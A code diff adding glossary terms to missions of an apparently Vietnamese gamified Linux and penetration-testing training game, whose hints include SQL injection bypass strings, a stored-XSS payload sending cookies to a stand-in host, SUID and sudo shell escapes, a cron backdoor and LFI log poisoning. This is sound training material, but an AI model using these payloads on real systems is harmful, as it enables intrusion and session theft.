@@ -29,6 +29,18 @@ import fsC10M1 from './filesystems/chapter10-mission1.js';
 import fsC10M2 from './filesystems/chapter10-mission2.js';
 import fsC10M3 from './filesystems/chapter10-mission3.js';
 
+// Mission bổ sung (bám syllabus chứng chỉ) — mỗi chương 1 file riêng để code song song không đụng nhau.
+import extra1 from './extra/chapter1.js';
+import extra2 from './extra/chapter2.js';
+import extra3 from './extra/chapter3.js';
+import extra4 from './extra/chapter4.js';
+import extra5 from './extra/chapter5.js';
+import extra6 from './extra/chapter6.js';
+import extra7 from './extra/chapter7.js';
+import extra8 from './extra/chapter8.js';
+import extra9 from './extra/chapter9.js';
+import extra10 from './extra/chapter10.js';
+
 // Mỗi step có:
 //   - description: hiển thị trong checklist
 //   - match: RegExp nhận diện lệnh đúng của step (đã chuẩn hoá khoảng trắng)
@@ -61,6 +73,12 @@ export const missions = {
         'Dùng `cd /var/log` rồi `ls` để xem có file gì.',
         'Gõ `tail -n 50 syslog` hoặc `tail -n 50 app/production.log` để xem 50 dòng cuối.',
       ],
+      terms: [
+        { term: 'tail -n 50', def: 'In 50 dòng cuối của file, hữu ích để soi log mới nhất.' },
+        { term: '/var/log', def: 'Thư mục chuẩn chứa log hệ thống và ứng dụng trên Linux.' },
+        { term: 'cd', def: 'Đổi thư mục làm việc hiện tại (change directory).' },
+        { term: 'ls', def: 'Liệt kê nội dung của một thư mục.' },
+      ],
       initialFilesystem: fsMission1,
     },
     {
@@ -78,6 +96,12 @@ export const missions = {
         'Dùng `find / -name "*.conf"` để tìm tất cả file .conf.',
         'Gõ `find / -name "*.conf"` rồi `cat <đường-dẫn-tìm-được>` để xem nội dung.',
       ],
+      terms: [
+        { term: 'find', def: 'Tìm file/thư mục theo điều kiện trong cả cây thư mục.' },
+        { term: 'find -name', def: 'Lọc kết quả find theo tên file, dùng được wildcard.' },
+        { term: 'wildcard *', def: 'Ký tự đại diện khớp chuỗi bất kỳ, ví dụ *.conf.' },
+        { term: 'cat', def: 'In toàn bộ nội dung file ra màn hình.' },
+      ],
       initialFilesystem: fsMission2,
     },
     {
@@ -94,6 +118,12 @@ export const missions = {
         'Mày cần lọc dòng theo từ khóa rồi lưu output ra file khác.',
         'Dùng `grep "ERROR" /var/log/api.log` để lọc dòng lỗi.',
         'Gõ `grep "ERROR" /var/log/api.log > errors.log` để lưu kết quả ra file errors.log.',
+      ],
+      terms: [
+        { term: 'grep', def: 'Lọc các dòng khớp một từ khoá hoặc mẫu trong văn bản.' },
+        { term: 'redirect >', def: 'Ghi stdout của lệnh vào file, ghi đè nội dung cũ.' },
+        { term: 'redirect >>', def: 'Ghi nối thêm stdout vào cuối file, không xoá nội dung cũ.' },
+        { term: 'stdout', def: 'Luồng xuất chuẩn của tiến trình, mặc định ra màn hình.' },
       ],
       initialFilesystem: fsMission3,
     },
@@ -114,6 +144,13 @@ export const missions = {
         'Mày cần xem process nào đang chạy và ngốn tài nguyên trước đã.',
         'Dùng `ps aux` (hoặc `top`) rồi để ý cột %CPU, tìm thằng cao bất thường.',
         'Tìm PID của process lạ rồi gõ `kill -9 <PID>`, ví dụ `kill -9 6713`.',
+      ],
+      terms: [
+        { term: 'ps aux', def: 'Liệt kê mọi tiến trình kèm CPU, RAM, user, PID.' },
+        { term: 'top', def: 'Theo dõi tiến trình thời gian thực, sắp theo tài nguyên.' },
+        { term: '%CPU', def: 'Phần trăm CPU mà một tiến trình đang chiếm.' },
+        { term: 'kill -9', def: 'Gửi SIGKILL buộc tiến trình chết ngay lập tức.' },
+        { term: 'PID', def: 'Mã định danh tiến trình, dùng để kill đúng mục tiêu.' },
       ],
       initialFilesystem: fsC2M1,
     },
@@ -144,6 +181,12 @@ export const missions = {
         'Dùng `systemctl status nginx` để xem, rồi `systemctl restart nginx` để khởi động lại.',
         'Gõ `systemctl restart nginx` rồi `systemctl enable nginx` để bật auto-start khi boot.',
       ],
+      terms: [
+        { term: 'systemctl status', def: 'Xem trạng thái và log gần nhất của một service.' },
+        { term: 'systemctl restart', def: 'Khởi động lại service đang chạy hoặc đã chết.' },
+        { term: 'systemctl enable', def: 'Đặt service tự khởi động mỗi khi máy boot.' },
+        { term: 'service unit', def: 'File .service mô tả cách systemd quản lý một dịch vụ.' },
+      ],
       initialFilesystem: fsC2M2,
     },
     {
@@ -161,6 +204,12 @@ export const missions = {
         'Mày cần một cron job chạy script theo giờ cố định mỗi ngày, không phải chạy 1 lần.',
         'Cron syntax là `phút giờ ngày tháng thứ lệnh`. Dùng `crontab -e` để mở và thêm dòng mới.',
         'Thêm dòng `0 2 * * * /opt/scripts/backup.sh` rồi `crontab -l` để kiểm tra.',
+      ],
+      terms: [
+        { term: 'crontab -e', def: 'Mở trình soạn để thêm/sửa lịch chạy lệnh tự động.' },
+        { term: 'crontab -l', def: 'Liệt kê các cron job hiện có của user.' },
+        { term: 'cron syntax', def: 'Năm trường: phút giờ ngày tháng thứ, rồi tới lệnh.' },
+        { term: '0 2 * * *', def: 'Lịch chạy đúng 2 giờ sáng mỗi ngày.' },
       ],
       initialFilesystem: fsC2M3,
     },
@@ -189,6 +238,12 @@ export const missions = {
         'Mày cần xem port 8080 đang được mở và bind vào địa chỉ nào.',
         'Dùng `ss -tulpn` hoặc `netstat -tulpn` để xem, để ý cột địa chỉ local.',
         'Để ý nó bind `127.0.0.1:8080` chứ không phải `0.0.0.0:8080` — chỉ localhost mới vào được. Đọc config app (`cat /etc/nginx/sites-enabled/app.conf`).',
+      ],
+      terms: [
+        { term: 'ss -tulpn', def: 'Liệt kê cổng đang lắng nghe kèm tiến trình giữ cổng.' },
+        { term: 'LISTEN', def: 'Trạng thái socket đang chờ kết nối đến trên một cổng.' },
+        { term: '127.0.0.1 vs 0.0.0.0', def: 'Bind 127.0.0.1 chỉ localhost vào được; 0.0.0.0 mở ra mọi interface.' },
+        { term: 'bind', def: 'Việc gắn một service vào địa chỉ IP và cổng cụ thể.' },
       ],
       initialFilesystem: fsC3M1,
     },
@@ -228,6 +283,12 @@ export const missions = {
         'Dùng `dig shop.acme-corp.com A` để xem A record, rồi `cat ticket.txt` để biết IP đúng.',
         'So IP trong ANSWER với 203.0.113.42; nếu lệch là sai. Thử `dig shop.acme-corp.com CNAME` để xem có CNAME nào lạ chen vào không.',
       ],
+      terms: [
+        { term: 'dig', def: 'Công cụ truy vấn DNS, xem domain trỏ về đâu.' },
+        { term: 'A record', def: 'Bản ghi DNS ánh xạ tên miền sang địa chỉ IPv4.' },
+        { term: 'CNAME', def: 'Bản ghi alias trỏ tên miền này sang tên miền khác.' },
+        { term: 'DNS resolution', def: 'Quá trình phân giải tên miền thành IP để kết nối.' },
+      ],
       initialFilesystem: fsC3M2,
     },
     {
@@ -261,6 +322,12 @@ export const missions = {
         'Dùng `tcpdump -i eth0 port 4444 -n` để capture, `-n` để không resolve DNS cho nhanh.',
         'Gõ `tcpdump -i eth0 port 4444 -nn -A` để thấy cả nội dung packet, để ý source IP 198.51.100.7 và pattern beacon lặp lại.',
       ],
+      terms: [
+        { term: 'tcpdump', def: 'Bắt và phân tích gói tin đi qua một interface mạng.' },
+        { term: '-A', def: 'Cờ tcpdump in payload gói tin dạng ASCII để đọc nội dung.' },
+        { term: 'C2 beacon', def: 'Tín hiệu định kỳ máy bị nhiễm gửi về máy chủ điều khiển.' },
+        { term: 'port 4444', def: 'Cổng hay bị dùng cho reverse shell / C2 (Metasploit mặc định).' },
+      ],
       initialFilesystem: fsC3M3,
     },
   ],
@@ -291,6 +358,12 @@ export const missions = {
         'Dùng `ssh-keygen -t ed25519` để tạo key, rồi `ssh-copy-id deploy@server` để đẩy public key.',
         'Sửa `/etc/ssh/sshd_config` đặt `PasswordAuthentication no` rồi `systemctl restart sshd` để áp dụng.',
       ],
+      terms: [
+        { term: 'ssh-keygen', def: 'Tạo cặp khoá công khai/bí mật để xác thực SSH.' },
+        { term: 'ssh-copy-id', def: 'Đẩy public key lên authorized_keys của server.' },
+        { term: 'authorized_keys', def: 'File chứa các public key được phép đăng nhập tài khoản.' },
+        { term: 'PasswordAuthentication no', def: 'Tắt đăng nhập bằng mật khẩu trong sshd_config.' },
+      ],
       initialFilesystem: fsC4M1,
     },
     {
@@ -307,6 +380,12 @@ export const missions = {
         'Mày cần local port forward: cổng local của mày -> 127.0.0.1:5432 trên server.',
         'Flag `-L` của ssh dùng để local forward: `ssh -L <local>:<đích>:<port> user@host`.',
         'Gõ `ssh -L 5432:127.0.0.1:5432 deploy@prod` rồi `psql -h localhost -p 5432` để kiểm tra.',
+      ],
+      terms: [
+        { term: 'ssh -L', def: 'Local port forward: chuyển cổng máy mình tới đích qua server SSH.' },
+        { term: 'port forward', def: 'Định tuyến một cổng cục bộ sang dịch vụ ở mạng khác.' },
+        { term: 'tunnel', def: 'Đường hầm mã hoá chở traffic xuyên qua kết nối SSH.' },
+        { term: '127.0.0.1:5432', def: 'Cổng PostgreSQL chỉ mở nội bộ trên server.' },
       ],
       initialFilesystem: fsC4M2,
     },
@@ -337,6 +416,12 @@ export const missions = {
         'rsync chỉ truyền phần khác biệt nên nhanh hơn scp khi sync lại.',
         'Dùng `rsync -avz ~/project/ deploy@prod:/var/www/app/` — chú ý dấu `/` cuối thư mục nguồn.',
         'Gõ `rsync -avz --exclude ".env" ~/project/ deploy@prod:/var/www/app/` để sync và loại file .env nhạy cảm ra. Kiểm tra: `ssh prod ls /var/www/app`.',
+      ],
+      terms: [
+        { term: 'rsync -avz', def: 'Đồng bộ thư mục: archive, verbose, nén khi truyền.' },
+        { term: '--exclude', def: 'Loại trừ file/thư mục khỏi quá trình sync (vd .env).' },
+        { term: 'incremental', def: 'Chỉ truyền phần khác biệt nên nhanh hơn copy lại toàn bộ.' },
+        { term: 'scp vs rsync', def: 'scp copy nguyên khối; rsync chỉ gửi delta, resume được.' },
       ],
       initialFilesystem: fsC4M3,
     },
@@ -381,6 +466,12 @@ export const missions = {
         'Dùng `nmap -p- 10.10.14.55` để quét full port, rồi `-sV` để lấy version.',
         'Gõ `nmap -A -p- 10.10.14.55` (gộp `-sV -O --script default`) để có cả service version lẫn OS guess.',
       ],
+      terms: [
+        { term: 'nmap', def: 'Công cụ quét cổng và dò service trên mục tiêu.' },
+        { term: '-p-', def: 'Quét toàn bộ 65535 cổng thay vì chỉ cổng phổ biến.' },
+        { term: '-sV', def: 'Dò phiên bản cụ thể của service đang chạy trên cổng.' },
+        { term: '-A', def: 'Gộp dò version, OS, script mặc định và traceroute.' },
+      ],
       initialFilesystem: fsC5M1,
     },
     {
@@ -409,6 +500,12 @@ export const missions = {
         'Bắt đầu bằng passive recon, ít gây ồn và nhanh.',
         'Dùng `subfinder -d acme-corp.com` hoặc check `crt.sh?q=acme-corp.com`.',
         'Gõ `subfinder -d acme-corp.com -o subs.txt` rồi đối chiếu thêm `amass enum -d acme-corp.com` để không sót.',
+      ],
+      terms: [
+        { term: 'subfinder', def: 'Liệt kê subdomain nhanh từ nhiều nguồn passive.' },
+        { term: 'amass', def: 'Công cụ enumerate subdomain sâu, kết hợp nhiều kỹ thuật.' },
+        { term: 'crt.sh', def: 'Tra Certificate Transparency log để lộ subdomain qua chứng chỉ.' },
+        { term: 'passive recon', def: 'Thu thập thông tin không gửi traffic trực tiếp tới target.' },
       ],
       initialFilesystem: fsC5M2,
     },
@@ -442,6 +539,12 @@ export const missions = {
         'Dùng `gobuster dir -u http://target -w wordlist.txt`.',
         'Gõ `gobuster dir -u http://target -w /home/hacker/wordlist.txt`; chú ý kết quả `/.git` và `/backup` rồi `cat /var/www/html/.git/config` xem.',
       ],
+      terms: [
+        { term: 'gobuster dir', def: 'Brute-force đường dẫn/thư mục ẩn trên web server.' },
+        { term: 'wordlist', def: 'Danh sách từ thử dùng để đoán file/thư mục/mật khẩu.' },
+        { term: 'directory brute-force', def: 'Dò path không có link công khai bằng cách thử hàng loạt.' },
+        { term: '.git exposure', def: 'Thư mục .git lộ ra cho phép tải lại toàn bộ mã nguồn.' },
+      ],
       initialFilesystem: fsC5M3,
     },
   ],
@@ -461,6 +564,12 @@ export const missions = {
         'Thử payload làm mệnh đề password luôn true, ví dụ `\' OR \'1\'=\'1`.',
         "Nhập username `admin' -- ` (có dấu cách sau --) để comment phần password đi, hoặc `' OR 1=1 -- ` để bypass.",
       ],
+      terms: [
+        { term: 'SQL Injection', def: 'Chèn cú pháp SQL vào input để đổi ý nghĩa câu truy vấn.' },
+        { term: "' OR '1'='1", def: 'Payload kinh điển làm mệnh đề điều kiện luôn đúng để bypass.' },
+        { term: 'comment --', def: 'Dấu chú thích SQL, cắt bỏ phần câu lệnh phía sau (vd check password).' },
+        { term: 'auth bypass', def: 'Đăng nhập không cần mật khẩu hợp lệ nhờ lỗ hổng logic/SQLi.' },
+      ],
       initialFilesystem: fsC6M1,
     },
     {
@@ -478,6 +587,12 @@ export const missions = {
         'Inject thẻ script gửi `document.cookie` về listener của mày.',
         "Post comment: `<script>fetch('http://MY_IP/c?'+document.cookie)</script>` rồi mở listener (vd `nc -lvnp 80`) chờ admin xem.",
       ],
+      terms: [
+        { term: 'stored XSS', def: 'Mã script độc được lưu lại và chạy trên trình duyệt nạn nhân.' },
+        { term: 'document.cookie', def: 'Thuộc tính JS chứa cookie phiên, mục tiêu để đánh cắp.' },
+        { term: 'payload <script>', def: 'Đoạn mã chèn vào để trình duyệt thực thi ngoài ý muốn.' },
+        { term: 'session hijack', def: 'Chiếm phiên đăng nhập của người khác bằng cookie cướp được.' },
+      ],
       initialFilesystem: fsC6M2,
     },
     {
@@ -494,6 +609,12 @@ export const missions = {
         'id nằm thẳng trong URL và server không check chủ sở hữu.',
         'Gửi request tới `/api/user/1` thay vì id của mày.',
         'Gõ `curl -H "Authorization: Bearer <token>" http://target/api/user/1` để đọc data admin.',
+      ],
+      terms: [
+        { term: 'IDOR', def: 'Truy cập thẳng tài nguyên người khác bằng cách đổi id, thiếu kiểm tra quyền.' },
+        { term: 'object reference', def: 'Tham chiếu trực tiếp tới đối tượng (id, file) trong request.' },
+        { term: 'authorization check', def: 'Bước kiểm tra user có quyền với tài nguyên hay không.' },
+        { term: 'API endpoint', def: 'Đường dẫn dịch vụ nhận request và trả dữ liệu.' },
       ],
       initialFilesystem: fsC6M3,
     },
@@ -520,6 +641,12 @@ export const missions = {
         'Dùng `find / -perm -4000 2>/dev/null`; chú ý `/usr/bin/find` trong kết quả.',
         'Tra GTFOBins cho `find`: `find . -exec /bin/sh -p \\; -quit` để có root shell, rồi `cat /root/.flag`.',
       ],
+      terms: [
+        { term: 'SUID bit', def: 'Cờ cho phép chạy file với quyền của chủ sở hữu (thường root).' },
+        { term: 'find -perm -4000', def: 'Tìm mọi binary có SUID bit trên hệ thống.' },
+        { term: 'GTFOBins', def: 'Kho tra cách lạm dụng binary hợp lệ để leo quyền/thoát shell.' },
+        { term: 'privilege escalation', def: 'Leo từ user thường lên quyền cao hơn (root).' },
+      ],
       initialFilesystem: fsC7M1,
     },
     {
@@ -537,6 +664,12 @@ export const missions = {
         'Xem cron của root và quyền của script nó chạy.',
         'Đọc `/etc/crontab`, kiểm tra `ls -l /opt/scripts/cleanup.sh` -> world-writable.',
         'Append `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash` vào cleanup.sh, đợi cron, chạy `/tmp/rootbash -p` rồi `cat /root/.flag`.',
+      ],
+      terms: [
+        { term: 'cron job', def: 'Tác vụ chạy tự động theo lịch, có thể bằng quyền root.' },
+        { term: 'world-writable', def: 'File ai cũng ghi được; nguy hiểm nếu bị root chạy.' },
+        { term: 'chmod +s', def: 'Gắn SUID bit để tạo binary chạy quyền chủ sở hữu.' },
+        { term: 'reverse shell', def: 'Shell từ máy nạn nhân kết nối ngược về máy attacker.' },
       ],
       initialFilesystem: fsC7M2,
     },
@@ -567,6 +700,12 @@ export const missions = {
         'Dùng `sudo -l` -> thấy `(root) NOPASSWD: /usr/bin/vim`.',
         'Gõ `sudo vim`, trong vim nhập `:!/bin/sh` (hoặc `:set shell=/bin/sh` rồi `:shell`) để ra root shell, sau đó `cat /root/.flag`.',
       ],
+      terms: [
+        { term: 'sudo -l', def: 'Liệt kê các lệnh user được phép chạy qua sudo.' },
+        { term: 'NOPASSWD', def: 'Cấu hình sudo cho chạy lệnh mà không cần nhập mật khẩu.' },
+        { term: 'shell escape', def: 'Thoát từ một chương trình ra shell với quyền của nó.' },
+        { term: 'GTFOBins', def: 'Kho tra cách lạm dụng binary hợp lệ để leo quyền/thoát shell.' },
+      ],
       initialFilesystem: fsC7M3,
     },
   ],
@@ -587,6 +726,12 @@ export const missions = {
         'Bypass login bằng `\' OR 1=1 -- `, rồi check quyền sudo của user vừa vào được (`sudo -l`).',
         "Privesc: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'` để thành root, rồi `cat /root/flag.txt` -> FLAG{easy_sqli_then_sudo_python3}.",
       ],
+      terms: [
+        { term: 'foothold', def: 'Chỗ đứng đầu tiên trong hệ thống sau khi khai thác thành công.' },
+        { term: 'sudo python3', def: 'Sudo cho chạy python3 rồi spawn shell root qua os.system.' },
+        { term: 'privesc chain', def: 'Nối nhiều lỗ hổng để đi từ web tới quyền root.' },
+        { term: 'flag', def: 'Chuỗi bí mật chứng minh đã chiếm mục tiêu (FLAG{...}).' },
+      ],
       initialFilesystem: fsC8M1,
     },
     {
@@ -606,6 +751,12 @@ export const missions = {
         'Login `ftp 10.10.10.35` (user anonymous), tìm thư mục upload web ghi được, đẩy 1 webshell vào rồi gọi qua web.',
         'Từ www-data dùng SUID nmap: `nmap --interactive` rồi `!sh` (GTFOBins) để thành root, `cat /root/flag.txt` -> FLAG{ftp_upload_rce_suid_nmap}.',
       ],
+      terms: [
+        { term: 'FTP anonymous', def: 'FTP cho đăng nhập không cần tài khoản, hay lộ thư mục ghi được.' },
+        { term: 'webshell RCE', def: 'Upload file thực thi để chạy lệnh từ xa qua web.' },
+        { term: 'SUID nmap', def: 'nmap --interactive rồi !sh để có shell root (GTFOBins).' },
+        { term: 'flag', def: 'Chuỗi bí mật chứng minh đã chiếm mục tiêu (FLAG{...}).' },
+      ],
       initialFilesystem: fsC8M2,
     },
     {
@@ -624,6 +775,12 @@ export const missions = {
         'Bài cuối — tự lực là chính, dùng hint càng ít càng tốt. Gợi ý duy nhất ở cấp này: domain chính chưa chắc là nơi có lỗ hổng, mày có chắc đã thấy hết bề mặt tấn công chưa?',
         'Sau khi tìm được subdomain/endpoint chứa lỗ hổng: để ý tham số load nội dung trang (kiểu `?page=`) và log truy cập web server — 2 thứ này có thể kết hợp với nhau.',
         'LFI include `/var/log/apache2/access.log`, inject PHP vào User-Agent để log poisoning lấy RCE thành www-data; sau đó cron root chạy world-writable `/opt/maint/run.sh` — append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt` -> FLAG{full_chain_lfi_logpoison_cron_root}.',
+      ],
+      terms: [
+        { term: 'LFI', def: 'Local File Inclusion: ép web include file nội bộ ngoài ý muốn.' },
+        { term: 'log poisoning', def: 'Nhét mã PHP vào log rồi LFI include để lấy RCE.' },
+        { term: 'RCE', def: 'Remote Code Execution: chạy lệnh tuỳ ý trên máy mục tiêu.' },
+        { term: 'cron privesc', def: 'Leo root nhờ cron của root chạy script mình ghi được.' },
       ],
       initialFilesystem: fsC8M3,
     },
@@ -667,6 +824,12 @@ export const missions = {
         'Attacker săn service account vì chúng thường có mật khẩu yếu/đặt lâu không đổi và quyền cao (SQL, web app pool).',
         'DEFENDER: dùng gMSA (Group Managed Service Account) với mật khẩu 120+ ký tự auto-rotate; nếu buộc dùng tài khoản thường thì password 25+ ký tự ngẫu nhiên; giám sát Event ID 4769 với encryption type RC4 (0x17) bất thường.',
       ],
+      terms: [
+        { term: 'SPN', def: 'Service Principal Name gắn tài khoản service với một dịch vụ.' },
+        { term: 'Kerberoasting', def: 'Xin TGS của tài khoản có SPN rồi crack offline lấy mật khẩu.' },
+        { term: 'TGS', def: 'Vé Kerberos cấp cho service, mã hoá bằng hash mật khẩu service.' },
+        { term: 'hashcat -m 13100', def: 'Chế độ hashcat để crack hash Kerberos TGS.' },
+      ],
       initialFilesystem: fsC9M1,
     },
     {
@@ -703,6 +866,12 @@ export const missions = {
         'Attacker ưu tiên dump LSASS để gom hash của mọi phiên đăng nhập còn nằm trong RAM, kể cả tài khoản cao hơn vừa login.',
         'DEFENDER: bật LAPS để mỗi máy có local admin password riêng & xoay vòng; bật SMB signing; bỏ tài khoản khỏi nhóm admin không cần thiết; Credential Guard để bảo vệ LSASS; giám sát đăng nhập NTLM type 3 bất thường giữa các workstation.',
       ],
+      terms: [
+        { term: 'NTLM hash', def: 'Băm mật khẩu Windows, đủ để xác thực mà không cần plaintext.' },
+        { term: 'Pass-the-Hash', def: 'Xác thực sang máy khác bằng chính NTLM hash đã dump.' },
+        { term: 'secretsdump', def: 'Công cụ impacket rút hash/credential từ máy đã chiếm.' },
+        { term: 'lateral movement', def: 'Di chuyển ngang từ máy này sang máy khác trong mạng.' },
+      ],
       initialFilesystem: fsC9M2,
     },
     {
@@ -736,6 +905,12 @@ export const missions = {
         'krbtgt là "chìa khoá vạn năng": hash của nó ký mọi TGT, nên forge Golden Ticket cho phép mạo danh bất kỳ ai, bỏ qua mật khẩu, tồn tại kể cả sau khi reset user.',
         'Đây là lý do reset krbtgt phải làm HAI LẦN (cách nhau) khi nghi bị xâm nhập — một lần không vô hiệu được vé cũ.',
         'DEFENDER: giới hạn quyền replication chỉ cho DC thật; mô hình tiered admin (Tier 0 cho DA, không đăng nhập DA xuống workstation); giám sát Event 4662 với GUID replication từ host không phải DC; phát hiện Golden Ticket qua vé có lifetime bất thường.',
+      ],
+      terms: [
+        { term: 'DCSync', def: 'Giả làm DC để yêu cầu replicate toàn bộ hash, kể cả krbtgt.' },
+        { term: 'krbtgt', def: 'Tài khoản ký mọi vé Kerberos; có hash của nó là làm chủ domain.' },
+        { term: 'Golden Ticket', def: 'TGT giả ký bằng krbtgt, mạo danh bất kỳ ai vĩnh viễn.' },
+        { term: 'replication', def: 'Cơ chế đồng bộ dữ liệu giữa các Domain Controller.' },
       ],
       initialFilesystem: fsC9M3,
     },
@@ -771,6 +946,12 @@ export const missions = {
         'docker.sock = quyền điều khiển Docker daemon (chạy bằng root trên host) -> tạo container mới mount toàn bộ host = game over.',
         'DEFENDER: không bao giờ mount docker.sock vào container ứng dụng; chạy rootless/userns-remap; bỏ capability thừa, đặt seccomp/AppArmor; read-only rootfs; tách workload nhạy cảm sang VM thay vì chỉ container.',
       ],
+      terms: [
+        { term: 'container escape', def: 'Thoát khỏi container để chạm tới host thật bên dưới.' },
+        { term: 'docker.sock', def: 'Socket điều khiển Docker daemon; mount vào container là chiếm host.' },
+        { term: '--privileged', def: 'Cờ chạy container với gần như toàn quyền trên host.' },
+        { term: '/proc/1/cgroup', def: 'Dấu hiệu nhận biết mình đang chạy bên trong container.' },
+      ],
       initialFilesystem: fsC10M1,
     },
     {
@@ -802,6 +983,12 @@ export const missions = {
         'checksec đọc các mitigation: Stack Canary chặn overflow tuyến tính, NX chặn chạy code trên stack, PIE/ASLR ngẫu nhiên hoá địa chỉ — thiếu cái nào mở ra kỹ thuật tương ứng.',
         'Tìm offset chính xác (cyclic pattern) là bước then chốt: lệch 1 byte là crash thay vì kiểm soát được RIP.',
         'DEFENDER: bật toàn bộ mitigation (canary, NX, full RELRO, PIE+ASLR); fortify source; fuzzing để diệt overflow từ trong CI; tách dịch vụ chạy quyền thấp + seccomp để giảm impact nếu vẫn bị khai thác.',
+      ],
+      terms: [
+        { term: 'buffer overflow', def: 'Ghi vượt vùng đệm, đè lên dữ liệu/điều khiển kế bên.' },
+        { term: 'ret2win', def: 'Đè saved return address để CPU nhảy vào hàm win() có sẵn.' },
+        { term: 'checksec', def: 'Kiểm tra cơ chế bảo vệ binary: canary, NX, PIE, RELRO.' },
+        { term: 'offset/RIP', def: 'Số byte cần ghi để chạm đúng địa chỉ trả về (saved RIP).' },
       ],
       initialFilesystem: fsC10M2,
     },
@@ -841,10 +1028,23 @@ export const missions = {
         'BloodHound cho attacker thấy đường ngắn nhất tới Domain Admin qua quan hệ ACL/nhóm mà admin không nhận ra mình đã tạo.',
         'DEFENDER: MFA mọi lối vào (đặc biệt VPN); chặn password reuse + theo dõi credential leak; mô hình tiered admin + least privilege; chạy BloodHound từ phía thủ để tự tìm và cắt các attack path trước khi attacker làm.',
       ],
+      terms: [
+        { term: 'OSINT', def: 'Thu thập thông tin công khai để tìm đường vào (breach, LinkedIn).' },
+        { term: 'credential reuse', def: 'Mật khẩu dùng lại từ vụ rò rỉ giúp đăng nhập hợp lệ.' },
+        { term: 'BloodHound', def: 'Vẽ đồ thị quan hệ AD để tìm đường ngắn nhất tới Domain Admin.' },
+        { term: 'Domain Admin', def: 'Quyền cao nhất kiểm soát toàn bộ Active Directory.' },
+      ],
       initialFilesystem: fsC10M3,
     },
   ],
 };
+
+// Gộp mission bổ sung vào từng chương (giữ thứ tự: bài gốc trước, bài mới sau)
+const _extras = { 1: extra1, 2: extra2, 3: extra3, 4: extra4, 5: extra5, 6: extra6, 7: extra7, 8: extra8, 9: extra9, 10: extra10 };
+for (const ch of Object.keys(_extras)) {
+  const list = _extras[ch];
+  if (Array.isArray(list) && list.length) missions[ch] = [...(missions[ch] || []), ...list];
+}
 
 export function getMission(chapterId, missionId) {
   return missions[chapterId]?.find((m) => m.id === missionId) ?? null;
